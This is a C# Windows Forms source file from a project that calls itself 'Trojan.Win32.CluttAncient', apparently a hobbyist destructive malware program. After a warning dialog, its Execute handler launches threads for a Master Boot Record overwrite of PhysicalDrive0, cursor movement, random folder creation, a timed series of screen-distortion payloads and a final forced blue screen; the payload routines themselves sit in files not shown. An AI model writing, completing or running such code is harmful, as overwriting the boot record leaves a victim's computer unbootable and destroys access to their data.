using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using CluttAncient;
using System.Runtime.InteropServices.ComTypes;

namespace CluttAncient
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.MaximizeBox = false;
            this.MinimizeBox = false;

            this.MaximumSize = new Size(822, 506);
            this.MinimumSize = new Size(822, 506);
            this.Text = "Trojan.Win32.CluttAncient (.NET Framework 4.7.2)";
            Button btnYes = new Button();
            btnYes.Text = "Execute";
            btnYes.BackColor = Color.Blue;
            btnYes.ForeColor = Color.White;
            btnYes.Location = new Point(100, 100);
            this.Controls.Add(btnYes);

            Button btnNo = new Button();
            btnNo.Text = "Exit";
            btnNo.BackColor = Color.Red;
            btnNo.ForeColor = Color.White;
            btnNo.Location = new Point(200, 200);
            this.Controls.Add(btnNo);

            btnYes.Click += new EventHandler(ButtonExecute);

        }

        private void ButtonExecute(object sender, EventArgs e)
        {
            this.Hide();
            Thread.Sleep(1000);
            DialogResult dialogResultM = MessageBox.Show("WARNING!\n\n You are about to run a malware called CluttAncient, that can overwrite your MasterBootRecord (\\\\.\\PhysicalDrive0)\n\tCreated by AjunWira\n\nProceed at your own risk..", "Clutt Ancient", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (dialogResultM == DialogResult.Yes)
            {
                Thread mbrth = new Thread(Anything.mbr); mbrth.Start();
                Thread mouses = new Thread(Anything.MoveCursor); mouses.Start();
                Thread createfol = new Thread(Anything.CreateRandomFolder);
                createfol.Start();
                Thread eclipse = new Thread(Payloads.lunareclipse);
                Thread texsts = new Thread(Payloads.texts);
                eclipse.Start();
                Thread.Sleep(5000);
                texsts.Start();
                Thread.Sleep(30000);
                eclipse.Abort();
                Thread.Sleep(60000);
                texsts.Abort();
                Thread bmps = new Thread(Payloads.bitmaps);
                bmps.Start();
                Thread.Sleep(6000);
                Thread bmps2 = new Thread(Payloads.bitmap2);
                bmps2.Start();

                Thread.Sleep(30000);
                bmps.Abort();
                Payloads.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(20000);
                Thread melt = new Thread(Payloads.melting);
                Thread textpr = new Thread(Payloads.texts2);
                melt.Start();
                textpr.Start();
                Thread.Sleep(10000);
                bmps2.Abort();

                Thread.Sleep(3000);
                Thread colvor = new Thread(Payloads.colorvortex);
                colvor.Start();

                melt.Abort();
                Thread t3 = new Thread(Payloads.texts3);
                textpr.Abort();
                t3.Start();

                Thread.Sleep(10000);
                t3.Abort();
                Thread morph = new Thread(Payloads.morphshape);
                morph.Start();
                Thread.Sleep(40000);
                Thread orbiting = new Thread(Payloads.orbitingballs);
                orbiting.Start();

                Thread.Sleep(30000);


                Thread bsodasshit = new Thread(Anything.BSOD);
                bsodasshit.Start();
            }
            else
            {
                this.Close();
                Application.Exit();
                Environment.Exit(0);
            }

        }

        private void ButtonExit(object sender, EventArgs e)
        {
            this.Close();
            Application.Exit();
            Environment.Exit(0);
        }
        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
